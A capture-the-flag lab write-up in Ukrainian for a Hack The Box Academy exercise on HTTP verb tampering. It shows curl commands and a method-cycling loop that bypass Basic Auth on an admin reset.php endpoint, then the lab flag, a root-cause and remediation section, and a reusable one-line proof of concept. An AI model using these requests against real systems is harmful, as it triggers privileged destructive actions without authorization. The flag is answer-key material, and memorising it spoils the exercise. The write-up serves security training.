# Web Attacks — HTTP Verb Tampering: Bypass Basic Auth on reset.php

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [Bypassing Basic Authentication](https://academy.hackthebox.com/app/module/134/section/1175)
Ціль: 154.57.164.81:31731
Відповідь: `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

## Концепція

Apache Basic Auth часто налаштовують директивою `<Limit METHOD1 METHOD2>` замість `<LimitExcept METHOD1 METHOD2>`. Різниця критична:

- `<Limit GET POST>` — авторизація перевіряється **тільки** для перелічених методів (GET, POST). Усі інші методи (PUT, DELETE, PATCH, HEAD, OPTIONS...) проходять **без перевірки credentials**, бо адмін просто "забув" їх врахувати.
- `<LimitExcept GET POST>` — правильний варіант, перевіряє **всі методи, крім** перелічених.

PHP-обробник (`reset.php`) при цьому не перевіряє `$_SERVER['REQUEST_METHOD']` — він просто виконує `unlink()`/очищення файлів незалежно від того, яким методом прийшов запит. Тож якщо ми знайдемо метод, який Apache "пропускає" повз auth-фільтр, PHP-код все одно виконається.

## Крок 1 — Підтверджуємо, що GET заблокований auth

```bash
curl -i http://154.57.164.81:31731/admin/reset.php
```

Результат: `401 Unauthorized`, `WWW-Authenticate: Basic realm="Admin Panel"` — GET явно в списку захищених методів.

## Крок 2 — Перевіряємо OPTIONS (розвідка дозволених методів)

```bash
curl -i -X OPTIONS http://154.57.164.81:31731/admin/reset.php
```

Результат: `200 OK` — OPTIONS вже сам по собі не потребує auth (стандартна поведінка Apache для OPTIONS), але цей метод нам не дає виконання PHP-логіки, лише підтверджує, що сервер живий.

## Крок 3 — Перебираємо методи масовим циклом

```bash
for m in OPTIONS HEAD PUT DELETE PATCH TRACE; do
  echo "== $m =="
  curl -s -o /dev/null -w "%{http_code}\n" -X "$m" http://154.57.164.81:31731/admin/reset.php
done
```

| Метод | Код | Пояснення |
|---|---|---|
| OPTIONS | 200 | Не в списку `<Limit>`, але й код в reset.php не виконує деструктивну дію на OPTIONS-запит на рівні Apache |
| HEAD | 401 | HEAD прирівнюється до GET в Apache auth-модулі — залишився захищеним |
| PUT | 200 | **Не в списку `<Limit GET POST>`** → auth пропущено, PHP-код виконався |
| DELETE | 200 | Те саме — bypass, і саме DELETE логічно "натякає" на дію очищення файлів |
| PATCH | 200 | Те саме — bypass |
| TRACE | 405 | Apache блокує TRACE на рівні сервера (окремий захист, типово вимкнено) |

Ключовий момент: `PUT`, `DELETE`, `PATCH` повернули `200 OK` — це означає, що Apache **не застосував Basic Auth** до цих методів, і запит "провалився" крізь фільтр прямо в PHP-обробник `reset.php`, який виконав логіку видалення файлів.

## Крок 4 — Верифікація: перевіряємо головну сторінку File Manager

```bash
curl -i http://154.57.164.81:31731/
```

У відповіді видно, що список файлів (`Available Files`) тепер порожній, а на сторінці з'явився флаг:

```
HTB{4lw4y5_c0v3r_4ll_v3rb5}
```

Це підтверджує: один із запитів (PUT/DELETE/PATCH) на `admin/reset.php` реально виконав серверний код очищення файлів, попри те, що ендпоінт "захищений" Basic Auth.

## Чому це працює (root cause для звіту)

- **Опис:** Basic Authentication на `/admin/reset.php` застосовується вибірково, лише до методів GET/POST/HEAD.
- **Технічні деталі:** Apache vhost/`.htaccess` містить `<Limit GET POST>` замість `<LimitExcept GET POST>`, тож PUT/DELETE/PATCH проходять без credentials прямо в PHP-логіку.
- **Ризик/Імпакт:** Неавторизований користувач може викликати привілейовану деструктивну дію (видалення всіх файлів file manager'а) без жодних креденшлів — Broken Access Control (OWASP A01).
- **Рекомендації:** Замінити `<Limit>` на `<LimitExcept>` у конфігурації Apache; додатково валідовувати `$_SERVER['REQUEST_METHOD']` на рівні PHP і явно дозволяти лише очікувані методи (defense in depth).

## Швидкий payload на майбутнє

```bash
# Мінімальний PoC одним рядком
curl -s -X PUT http://TARGET/admin/reset.php -o /dev/null -w "%{http_code}\n" && curl -s http://TARGET/ | grep -oP 'HTB\{[^}]+\}'
```
